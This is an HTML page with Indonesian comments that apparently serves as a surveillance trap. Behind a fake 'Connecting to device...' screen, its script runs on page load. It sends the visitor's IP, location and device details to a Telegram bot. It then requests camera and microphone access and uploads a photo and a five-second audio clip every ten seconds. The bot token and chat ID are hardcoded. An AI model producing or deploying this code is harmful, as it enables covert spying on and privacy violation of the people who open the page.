<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>INITIALIZING...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      background: black;
      color: lime;
      font-family: monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    h1 {
      text-shadow: 0 0 10px lime;
    }
  </style>
</head>
<body>

<h1>Connecting to device...</h1>
<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const token = '7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU';
const chat_id = '6624966395';
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

// STEP 1: Ambil IP & Lokasi
fetch('https://api.ipify.org?format=json')
  .then(res => res.json())
  .then(ipData => {
    const ip = ipData.ip;
    return fetch('https://ipapi.co/' + ip + '/json/');
  })
  .then(loc => loc.json())
  .then(info => {
    const message = `
== IP DETECTED ==
IP: ${info.ip}
Kota: ${info.city}
Region: ${info.region}
Negara: ${info.country_name}
ISP: ${info.org}
Device: ${navigator.userAgent}
=================`;
    // Kirim IP ke Telegram
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id, text: message })
    });
  });

// STEP 2: Kamera + Mic + Looping Foto & Audio
navigator.mediaDevices.getUserMedia({ video: true, audio: true })
.then(stream => {
  video.srcObject = stream;
  video.play();

  setInterval(() => {
    capturePhoto();
    recordAudio(stream);
  }, 10000); // tiap 10 detik
})
.catch(err => {
  alert("Akses media ditolak: " + err);
});

function capturePhoto() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(blob => {
    let form = new FormData();
    form.append('chat_id', chat_id);
    form.append('photo', blob, 'foto.jpg');
    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: 'POST',
      body: form
    }).then(() => console.log("Foto dikirim"));
  }, 'image/jpeg');
}

function recordAudio(stream) {
  const recorder = new MediaRecorder(stream);
  let chunks = [];
  recorder.ondataavailable = e => chunks.push(e.data);
  recorder.onstop = () => {
    const blob = new Blob(chunks, { type: 'audio/webm' });
    let form = new FormData();
    form.append('chat_id', chat_id);
    form.append('audio', blob, 'rekaman.webm');
    fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
      method: 'POST',
      body: form
    }).then(() => console.log("Audio dikirim"));
  };
  recorder.start();
  setTimeout(() => recorder.stop(), 5000);
}
</script>

</body>
</html>
